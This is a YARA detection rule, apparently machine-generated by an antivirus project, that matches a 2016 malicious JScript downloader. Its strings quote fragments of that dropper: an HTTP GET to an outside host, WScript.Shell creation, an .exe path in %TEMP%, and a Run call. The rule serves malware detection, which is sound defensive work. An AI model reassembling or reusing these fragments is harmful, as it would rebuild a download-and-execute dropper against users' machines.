rule sig_20160330_02df73099d84c75819ed82563167d3a8 {
  meta:
    description = "datamaliciousorder - file 20160330_02df73099d84c75819ed82563167d3a8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "64fc41939e547ee35405b4be479660639d5bc9f06ac0ddb181a1ace56b2eb7ab"

  strings:
    $s1  = "_F[_P](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "var _J0 = function _U() {return WScript[_T](\"WScript\"+\".Shell\");}(), _CB0 = 11;" fullword ascii
    $s3  = "function _CS(_DA, _O1){_X = _X * 1; return _DA - _O1;};" fullword ascii
    $s4  = "if (_F[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _BU(){return _CK + \"\";};" fullword ascii
    $s6  = "function _K() {return _J0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7Grx4Wi5y0xi3xDz.ex\" + \"e\";};" fullword ascii
    $s7  = "function _I(_G){_J0[\"Run\"](_G, _X, _X);};" fullword ascii
    $s8  = "function _S() {return ((_QH == true) && (_QH == _SS)) ? 1 : _X;};" fullword ascii
    $s9  = "function _NX(_DC) {var _NP = (1, 2, 3, 4, 5, _DC); return _NP;};" fullword ascii
    $s10 = "function _BY(){return _T;};" fullword ascii
    $s11 = "function _UP()" fullword ascii
    $s12 = "var _B = new this[\"Date\"]();" fullword ascii
    $s13 = " while (_AE){" fullword ascii
    $s14 = "return _CS(_QA, _O0);" fullword ascii
    $s15 = "function _H(){return 22;};" fullword ascii
    $s16 = "var _SO = false;" fullword ascii
    $s17 = "_SS = true; " fullword ascii
    $s18 = "var _SS = false;" fullword ascii
    $s19 = "var _QH = false;" fullword ascii
    $s20 = "_QH = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}